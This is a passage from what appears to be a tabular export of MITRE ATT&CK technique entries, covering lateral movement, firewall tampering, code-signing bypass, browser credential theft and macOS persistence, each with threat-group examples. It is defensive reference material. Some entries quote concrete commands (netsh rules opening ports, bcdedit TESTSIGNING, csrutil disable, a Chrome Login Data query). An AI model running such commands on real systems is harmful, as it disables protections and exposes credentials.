smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.', 'Adversaries can instruct [Duqu] to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.', '[Kwampirs] copies itself over network shares to move laterally on a victim network.', '[ToddyCat] has used locally mounted network shares for lateral movement through targated environments.', '[APT3] will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.', 'Lateral movement can be done with [Net] through <code>net use</code> commands to connect to the on remote systems.', '[FIN8] has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context. [FIN8] has also used smbexec from the [Impacket] suite for lateral movement.', 'During [Cutting Edge] threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB.', 'The [Regin] malware platform can use Windows admin shares to move laterally.', '[Blue Mockingbird] has used Windows Explorer to manually copy malicious files to remote hosts over SMB.', ""[APT32] used [Net] to use Windows' hidden network shares to copy their tools to remote machines for execution."", '[Stuxnet] propagates to available network shares.', '[Cinnamon Tempest] has used SMBexec for lateral movement.', '[Cobalt Strike] can use Window admin shares (C$ and ADMIN$) for lateral movement.', '[Olympic Destroyer] uses [PsExec] to interact with the <code>ADMIN$</code> network share to execute commands on remote systems.', '[Orangeworm] has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.', '[Lazarus Group] malware SierraAlfa accesses the <code>ADMIN$</code> share via SMB to conduct lateral movement.', '[Net Crawler] uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.', '[Lucifer] can infect victims by brute forcing SMB.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] utilized `net use` to connect to network shares.', '[Deep Panda] uses net.exe to connect to network shares using <code>net use</code> commands with compromised credentials.', '[Anchor] can support windows execution via SMB shares.', '[APT39] has used SMB for lateral movement.', '[APT28] has mapped network drives using [Net] and administrator credentials.', '[APT29] has used administrative accounts to connect over SMB to targeted users.', ""[Operation Wocao] has used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally."", '[Cobalt Strike] can use Window admin shares (C$ and ADMIN$) for lateral movement.']",False
T1218.002,Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.  Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.   Malicious Control Panel items can be delivered via [Phishing] campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.  Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.","['[Ember Bear] has used control panel files (CPL), delivered via e-mail, for execution.', '[InvisiMole] can register itself for execution and persistence via the Control Panel.', '[Reaver] drops and executes a malicious CPL file as its payload.']",
T1599.001,Network Address Translation Traversal,"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.  Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.  When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.    Adversaries may use [Patch System Image] to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",[],
T1608.002,Upload Tool,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec] Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer] by placing it on an Internet accessible web server.  Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure] or was otherwise compromised by them ([Compromise Infrastructure] Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.  Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.","['For [Operation Dream Job] [Lazarus Group] used multiple servers to host malicious tools.', 'For [C0010] UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.', '[Threat Group-3390] has staged tools, including [gsecdump] and WCE, on previously compromised websites.', '[Lazarus Group] has hosted custom and open-source tools on compromised as well as [Lazarus Group] servers.']",False
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.  The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.","['The [Mimikatz] credential dumper contains an implementation of an SSP.', '[Empire] can enumerate Security Support Providers (SSPs) as well as utilize [PowerSploit] <code>Install-SSP</code> and <code>Invoke-Mimikatz</code> to install malicious SSPs and log authentication events.', '[PowerSploit] <code>Install-SSP</code> Persistence module can be used to establish by installing a SSP DLL.', '[Lazarus Group] has rebooted victim machines to establish persistence by installing a SSP DLL.']",
T1597.001,Threat Intel Vendors,"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.  Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Exploit Public-Facing Application] or [External Remote Services]",[],
T1602.002,Network Device Configuration Dump,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.  Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",[],
T1562.004,Disable or Modify System Firewall,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.  Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port]  Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services] may also indirectly modify firewall rules.","['[InvisiMole] has a command to disable routing and the Firewall on the victim’s machine.', '[Carbanak] may use [netsh] to add local firewall rule exceptions.', ""[NanoCore] can modify the victim's firewall."", '[BADCALL] disables the Windows firewall before binding to a port.', '[Rocke] used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.\t', '[TeamTNT] has disabled <code>iptables</code>.', '[H1N1] kills and disables services for Windows Firewall.', '[TYPEFRAME] can open the Windows Firewall on the victim’s machine to allow incoming connections.', '[Dragonfly] has disabled host-based firewalls. The group has also globally opened port 3389.', '[netsh] can be used to disable local firewall settings.', '[PyDCrypt] has modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections using `netsh.exe` on remote machines.', '[Cyclops Blink] can modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers.', '[Moses Staff] has used batch scripts that can disable the Windows firewall on specific remote machines.', '[njRAT] has modified the Windows firewall to allow itself to communicate through the firewall.', '[Grandoreiro] can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.', '[Remsec] can add or remove applications or ports on the Windows firewall or disable it entirely.', 'Prior to executing a backdoor [ToddyCat]  has run `cmd /c start /b netsh advfirewall firewall add rule name=""SGAccessInboundRule"" dir=in protocol=udp action=allow localport=49683` to allow the targeted system to receive UDP packets on port 49683.', '[ZxShell] can disable the firewall by modifying the registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile</code>. ', '[DarkComet] can disable Security Center functions like the Windows Firewall.', '[CookieMiner] has checked for the presence of ""Little Snitch"", macOS network monitoring and application firewall software, stopping and exiting if it is found.', '[Magic Hound] has added the following rule to a victim\'s Windows firewall to allow RDP traffic - `""netsh"" advfirewall firewall add rule name=""Terminal Server"" dir=in action=allow protocol=TCP localport=3389`.', 'During [Operation Wocao] threat actors used PowerShell to add and delete rules in the Windows firewall.', 'Various [Lazarus Group] malware modifies the Windows firewall to allow incoming connections or disable it entirely using [netsh] ', '[APT38] have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.', '[Kimsuky] has been observed disabling the system firewall.', '[HOPLIGHT] has modified the firewall using [netsh]\t', '[HARDRAIN] opens the Windows Firewall to modify incoming connections.', 'The ""ZR"" variant of [BACKSPACE] will check to see if known host-based firewalls are installed on the infected systems. [BACKSPACE] will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.', '[Kasidet] has the ability to change firewall settings to allow a plug-in to be downloaded.', 'During the [SolarWinds Compromise] [APT29] used `netsh` to configure firewall rules that limited certain UDP outbound packets.', '[UNC2452] used <code>netsh</code> to configure firewall rules that limited certain UDP outbound packets.', '[APT29] used <code>netsh</code> to configure firewall rules that limited certain UDP outbound packets.', '[Operation Wocao] has used PowerShell to add and delete rules in the Windows firewall.', '[Dragonfly 2.0] has disabled host-based firewalls. The group has also globally opened port 3389.']",False
T1553.003,SIP and Trust Provider Hijacking,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.   Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs).   Similar to [Code Signing] adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by:   * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex). * **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking]  Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. ",[],False
T1071.003,Mail Protocols,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","['[ComRAT] can use email attachments for command and control.', '[LightNeuron] uses SMTP for C2.', '[CORESHELL] can communicate over SMTP and POP3 for C2.', '[BadPatch] uses SMTP for C2.', 'Various implementations of [CHOPSTICK] communicate with C2 over SMTP and POP3.', '[Turla] has used multiple backdoors which communicate with a C2 server via email attachments.', '[Uroburos] can use custom communications protocols that ride over SMTP.', '[JPIN] can send email over SMTP.', '[Remsec] is capable of using SMTP for C2.', '[NavRAT] uses the email platform, Naver, for C2 communications, leveraging SMTP.', '[SilverTerrier] uses SMTP for C2 communications.', '[Cannon] uses SMTP/S and POP3/S for C2 communications by sending and receiving emails.', '[Zebrocy] uses SMTP and POP3 for C2.', '[OLDBAIT] can use SMTP for C2.', '[APT32] has used email for C2 via an Office macro.', '[RDAT] can use email attachments for C2 communications.', '[NightClub] can use emails for C2 communications.', '[APT28] has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.', '[Kimsuky] has used e-mail to send exfiltrated data to C2 servers.', '[Agent Tesla] has used SMTP for C2 communications.', '[Goopy] has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.\t', 'A [SUGARDUMP] variant used SMTP for C2.']",False
T1556.007,Hybrid Identity,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.    Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD:  * Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud  * Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory  * Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD   AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges.   By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials. In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.  In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.","['[AADInternals] can inject a malicious DLL (`PTASpy`) into the `AzureADConnectAuthenticationAgentService` to backdoor Azure AD Pass-Through Authentication.', '[APT29] has edited the `Microsoft.IdentityServer.Servicehost.exe.config` file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.']",False
T1595.002,Vulnerability Scanning,"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.  These scans may also include more broad attempts to [Gather Victim Host Information] that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Exploit Public-Facing Application]","['[Sandworm Team] has scanned network infrastructure for vulnerabilities as part of its operational planning.', 'During [Cutting Edge] threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893.', '[Volatile Cedar] has performed vulnerability scans of the target server.', '[APT41] used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications.', '[TeamTNT] has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.', '[APT28] has performed large-scale scans in an attempt to find vulnerable servers.', '[Magic Hound] has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs.', '[APT29] has conducted widespread scanning of target environments to identify vulnerabilities for exploit.', '[Aquatic Panda] has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).', '[Dragonfly] has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services.', '[Earth Lusca] has scanned for vulnerabilities in the public-facing servers of their targets.']",False
T1059.009,Cloud API,"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell] modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as [Python]    Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.  With proper permissions (often via use of credentials such as [Application Access Token] and [Web Session Cookie] adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ","['[Pacu] leverages the AWS CLI for its operations.', '[TeamTNT] has leveraged AWS CLI to enumerate cloud environments with compromised credentials.', '[APT29] has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API ']",False
T1218.015,Electron Applications,"Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.  Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=""C:\Windows\system32\cmd.exe /c calc.exe`).  Adversaries may also execute malicious content by planting malicious [JavaScript] within Electron applications.",[],False
T1562.012,Disable or Modify Linux Audit System,"Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.  Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.  With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.",[],False
T1553.006,Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.   Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.  Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry] rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.  To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation] using a signed, but vulnerable driver.","['[APT39] has used malware to turn off the <code>RequireSigned</code> feature which ensures only signed DLLs can be run on Windows.', '[BlackEnergy] has enabled the <code>TESTSIGNING</code> boot configuration option to facilitate loading of a driver component.', '[Hikit] has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.', '[Pandora] can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.', '[Turla] has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.']",False
T1543.004,Launch Daemon,"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.  Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading] When the Launch Daemon is executed, the program inherits administrative permissions.  Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.","['[Green Lambert] can add a plist file in the `Library/LaunchDaemons` to establish persistence. ', '[COATHANGER] will create a daemon for timed check-ins with command and control infrastructure.', 'When running with root privileges after a [Launch Agent] is installed, [ThiefQuest] installs a plist file to the <code>/Library/LaunchDaemons/</code> folder with the <code>RunAtLoad</code> key set to <code>true</code> establishing persistence as a Launch Daemon. ', '[LoudMiner] adds plist files with the naming format <code>com.[random_name].plist</code> in the <code>/Library/LaunchDaemons</code> folder with the RunAtLoad and KeepAlive keys set to <code>true</code>.', 'If running with <code>root</code> permissions, [OSX_OCEANLOTUS.D] can create a persistence file in the folder <code>/Library/LaunchDaemons</code>.', '[Bundlore] can persist via a LaunchDaemon.', '[Dacls] can establish persistence via a Launch Daemon.', '[XCSSET] uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim.', '[AppleJeus] has placed a plist file within the <code>LaunchDaemons</code> folder and launched it manually.']",
T1555.003,Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.  For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.   Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager]  Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.  After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","['[njRAT] has a module that steals passwords saved in victim web browsers.', '[BlackEnergy] has used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer.', '[H1N1] dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.', '[Mispadu] can steal credentials from Google Chrome.', '[Imminent Monitor] has a PasswordRecoveryPacket module for recovering browser passwords.', '[Olympic Destroyer] contains a module that tries to obtain stored credentials from web browsers.', '[Javali] can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge.', '[CookieMiner] can steal saved usernames and passwords in Chrome as well as credit card credentials.', '[Patchwork] dumped the login data database from <code>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>.', '[SUGARDUMP] variants have harvested credentials from browsers such as Firefox, Chrome, Opera, and Edge.', '[APT41] used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.', '[WarzoneRAT] has the capability to grab passwords from numerous web browsers as well as from Outlook and Thunderbird email clients.', '[ZIRCONIUM] has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.', '[KONNI] can steal profiles (containing credential information) from Firefox, Chrome, and Opera.', '[Malteiro] has stolen credentials stored in the victim’s browsers via software tool NirSoft WebBrowserPassView.', ""During the [SolarWinds Compromise] [APT29] stole users' saved passwords from Chrome."", '[ROKRAT] can steal credentials stored in Web browsers by querying the sqlite database.', '[QuasarRAT] can obtain passwords from common web browsers.', '[APT3] has used tools to dump passwords from browsers.', '[LaZagne] can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.', '[APT33] has used a variety of publicly available tools like [LaZagne] to gather credentials.', '[RedLeaves] can gather browser usernames and passwords.', '[Stealth Falcon] malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.', '[TSCookie] has the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers.', '[Smoke Loader] searches for credentials stored from web browsers.', '[Agent Tesla] can gather credentials from a number of browsers. ', '[Pupy] can use Lazagne for harvesting credentials.', '[Machete] collects stored credentials from several web browsers. ', ""[Azorult] can steal credentials from the victim's browser."", 'A module in [Prikormka] gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.', '[Trojan.Karagany] can steal data and credentials from browsers.', '[KGH_SPY] has the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers.', '[Leafminer] used several tools for retrieving login and password information, including LaZagne.', '[APT37] has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.', '[CosmicDuke] collects user credentials, including passwords, for various programs including Web browsers.', '[Sandworm Team] CredRaptor tool can collect saved passwords from various internet browsers.', '[OLDBAIT] collects credentials from Internet Explorer, Mozilla Firefox, and Eudora.', '[RainyDay] can use tools to collect credentials from web browsers.', '[Mimikatz] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.\t', '[Emotet] has been observed dropping browser password grabber modules. ', '[MuddyWater] has run tools including Browser64 to steal passwords saved in victim web browsers.', '[jRAT] can capture passwords from common web browsers such as Internet 